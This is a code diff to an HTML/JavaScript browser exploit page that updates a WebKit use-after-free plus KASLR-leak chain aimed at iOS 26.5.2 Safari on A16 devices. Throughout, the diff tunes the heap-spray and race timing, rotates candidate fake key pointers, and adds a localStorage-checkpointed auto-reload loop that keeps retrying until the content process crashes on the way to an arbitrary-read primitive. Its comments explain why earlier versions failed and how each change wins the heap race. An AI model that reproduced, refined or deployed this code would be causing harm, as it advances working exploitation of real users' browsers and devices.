@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebKit UAF + KASLR v55 — iOS 26.5.2 A16 (P6B: spray charCount=p6FreedSz-24=1000→1024B exact + 64 candidates + retry shuffle)</title>
+<title>WebKit UAF + KASLR v56 — iOS 26.5.2 A16 (P6B: zero-tick bonus pumps + fixed candidate rotation + 50 retries)</title>
 </head>
 <body>
 <div style="position:fixed;top:8px;right:12px;z-index:9999">
@@ -1679,7 +1679,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
 
 (async () => {
-  log('=== WebKit UAF + KASLR v55 (P6B: spray charCount=1000→1024B exact + 64 cands + retry shuffle → KERN_INVALID_ADDRESS) ===');
+  log('=== WebKit UAF + KASLR v56 (P6B: zero-tick bonus pumps + fixed cand rotation + 50 retries → KERN_INVALID_ADDRESS) ===');
   log('=== Target: iOS 26.5.2 / safari-7625.1.29.11 / A16 arm64e ===');
   log('=== UAF: ManualSlotAssignment WeakHashMap rehash (rdar://179729192) ===\n');
 
@@ -1693,7 +1693,7 @@ function checkNodeLeak(nodes, expectedNode) {
   // p6b_retry_count = integer retry counter (0-19)
   const P6B_PROBE_KEY   = 'p6b_probe';
   const P6B_RETRY_KEY   = 'p6b_autoretry';
-  const P6B_RETRY_MAX   = 20;
+  const P6B_RETRY_MAX   = 50;  // v56: bumped from 20 → 50 (stochastic race needs more iterations)
 
   // ── P6B crash-recovery: check if prior run crashed mid-probe ────────────────
   // If the UAF traversal derefs a bad key VA, the WebContent process dies.
@@ -1732,10 +1732,10 @@ function checkNodeLeak(nodes, expectedNode) {
     if (_rStr) {
       _v52RetryState = JSON.parse(_rStr);
       const _rc = parseInt(localStorage.getItem('p6b_retry_count') || '0');
-      log(`\n[v55 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
-      log(`[v55 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
-      log(`[v55 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
-      log(`[v55 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
+      log(`\n[v56 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
+      log(`[v56 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
+      log(`[v56 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
+      log(`[v56 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
       log('');
     }
   } catch(_) { _v52RetryState = null; }
@@ -2430,7 +2430,7 @@ function checkNodeLeak(nodes, expectedNode) {
   if (sprayHex && sprayHex.length > 0) {
     log('\n[*] Phase 6: Arb-read primitive — probing oracle candidates...');
     log(`[*] Running on: ${hardConfirmed ? 'HARD confirmed' : 'SOFT signal (injection fired)'}`);
-    log(`[*] Testing top ${Math.min(64, sprayHex ? sprayHex.length : 64)} HIGH-conf candidates as fake key ptrs (v55: window rotates each retry)`);
+    log(`[*] Testing top ${Math.min(64, sprayHex ? sprayHex.length : 64)} HIGH-conf candidates as fake key ptrs (v56: window rotates each retry from original list)`);
     log('[*] VA LIMITATION: oracle offsets are Gigacage-relative, NOT absolute VAs.');
     log('[*]   candidateOffset=0x130000 → key=0x0000000000130000 → unmapped on arm64');
     log('[*]   All probes will crash until gigacageBase is known.');
@@ -2882,31 +2882,26 @@ function checkNodeLeak(nodes, expectedNode) {
           //   SHRINK: free(oldBucket 1024B) → slotchange fires → wave1 spray (4096×1008-char)
           //   reclaims freed 1024B slot.
           targetSlot.assign(childA);
-          // Step 11: 2 ticks — microtasks drain (slotchange + spray runs)
-          await new Promise(r => setTimeout(r, 0));
-          await new Promise(r => setTimeout(r, 0));
-          // ── v53 KEY FIX: bonus pumps post-SHRINK ─────────────────────────────────
-          // ROOT CAUSE of v52 20/20 NO-CRASH:
-          //   After SHRINK fires, opCount resets to 0 in the new bucket.
-          //   The trigger assign() is the LAST operation — nobody reads the freed bucket.
-          //   effectiveCurrent() is never called on the stale m_slots ptr after spray lands.
+          // ── v56 KEY FIX: zero-tick between trigger and bonus pumps ───────────────
+          // v55 timing: trigger → 2 ticks → bonus pumps → traversal
+          //   Problem: 2 ticks gives bmalloc C++ finalizer time to reuse the freed
+          //   1024B oldBucket BEFORE our spray StringImpl reclaims it.
+          //   The freed slot is given away to internal allocator use → spray misses → no crash.
           //
-          // FIX (from v40 confirmed-crashing recipe):
-          //   After trigger + 2 ticks: add 8 bonus assign() calls.
-          //   Each assign() → slotManualAssignmentDidChange → m_slots.ensure() →
-          //   amortizedCleanup() → opCount += 2 → when opCount > threshold:
-          //   2nd amortizedCleanup fires → TRAVERSES new bucket (= our fake spray StringImpl)
-          //   → bucket[0].key = u64(refCount=1|charCount<<32) → unmapped VA → KERN_INVALID_ADDRESS
+          // v56 fix: trigger → 1 tick (slotchange + spray fire) → IMMEDIATELY bonus pump
+          //   The slotchange fires synchronously after assign(). One tick drains it.
+          //   Then bonus pumps run before any finalizer gets the freed slot back.
+          //   Window: spray StringImpl constructs in tick N, bonus pump traverses in tick N+0.
+          //   This tightens the race: spray must land before finalizer in the SAME tick.
           //
-          //   10 bonus pumps × 2 ops = 20 ops. New-bucket threshold = newCap/2 = 8.
-          //   v53 bug: 8 pumps → opCount=8, threshold=8 → 8 > 8 = FALSE → no cleanup.
-          //   v54 fix: 10 pumps → opCount=10 > threshold=8 → TRUE → 2nd amortizedCleanup → TRAVERSAL → crash.
-          const _bonusPumps = 10;  // v54: was 8, need > newCap/2=8, so 9+ required
+          //   10 bonus pumps → opCount=10 > threshold=8 → 2nd amortizedCleanup → crash.
+          await new Promise(r => setTimeout(r, 0));  // 1 tick: slotchange + spray runs
+          // NO second tick — go straight to bonus pumps
+          const _bonusPumps = 10;
           for (let _bp = 0; _bp < _bonusPumps; _bp++) {
             targetSlot.assign(_bp % 2 === 0 ? childB : childA);
           }
-          // Step 12: 2 more ticks — bonus pump microtasks drain
-          await new Promise(r => setTimeout(r, 0));
+          // Step 12: 1 tick — bonus pump microtasks drain
           await new Promise(r => setTimeout(r, 0));
           // Step 13: check injection
           p6Injected = _pc.isInjected();
@@ -2973,32 +2968,37 @@ function checkNodeLeak(nodes, expectedNode) {
         const _retryCount = parseInt(localStorage.getItem('p6b_retry_count') || '0');
         log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount}/${_p6bCandToTry.length} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
         if (candidates.length > 0 && gigacageBase !== 0n && _retryCount < P6B_RETRY_MAX) {
-          // v55: rotate candidate array by 64 on each retry so each pass probes a different window.
-          // candidates has up to 128 entries; rotate by (_retryCount * 64) % candidates.length.
-          // Pass 0: [0..63], Pass 1: [64..127], Pass 2: [0..63] again, etc.
-          // This ensures full coverage of all 128 HIGH candidates across 2 retries.
-          const _rotateBy = ((_retryCount + 1) * 64) % Math.max(1, candidates.length);
-          const _rotated = [...candidates.slice(_rotateBy), ...candidates.slice(0, _rotateBy)];
+          // v56: fixed candidate rotation — always rotate from ORIGINAL list, not previously-rotated list.
+          // v55 bug: saved `_rotated` as `candidates` each retry → list shrank when length < 64.
+          // v56 fix: save `originalCandidates` separately; each retry rotates from original.
+          // Pass 0: original[0..63], Pass 1: original[64..127], Pass 2: original[0..63] (wraps), etc.
+          // Full 128-entry coverage maintained across all retries regardless of rotation count.
+          const _origCands = (_v52RetryState && _v52RetryState.originalCandidates)
+            ? _v52RetryState.originalCandidates.map(Number)
+            : candidates;
+          const _rotateBy = ((_retryCount + 1) * 64) % Math.max(1, _origCands.length);
+          const _rotated = [..._origCands.slice(_rotateBy), ..._origCands.slice(0, _rotateBy)];
           // save oracle state so next run skips Phase 1-5
           try {
             const _retryData = {
               gigacageBase: gigacageBase.toString(16),
-              candidates: _rotated.map(String), // rotated offsets — window shifts each retry
+              originalCandidates: _origCands.map(String), // v56: always save original for stable rotation
+              candidates: _rotated.map(String),            // rotated window for this pass
               ts: Date.now(),
               retryNum: _retryCount + 1
             };
             localStorage.setItem(P6B_RETRY_KEY, JSON.stringify(_retryData));
             localStorage.setItem('p6b_retry_count', String(_retryCount + 1));
-            log(`[v55 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
-            log('[v55 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
-            log('[v55 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
+            log(`[v56 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
+            log('[v56 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
+            log('[v56 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
             setTimeout(() => { location.reload(); }, 800);
           } catch(_retryErr) {
-            log(`[v55 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
+            log(`[v56 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
           }
         } else if (_retryCount >= P6B_RETRY_MAX) {
-          log(`[v55 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
-          log('[P6] Possible causes after 20× retry:');
+          log(`[v56 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
+          log('[P6] Possible causes after 50× retry:');
           log('[P6]   1. gigacageBase wrong — spray VA does not correspond to freed bucket addr');
           log('[P6]   2. bmalloc size-class segregation preventing reclaim of 1024B slot by our spray');
           log('[P6]   3. SHRINK timing window closed before spray StringImpl constructed');
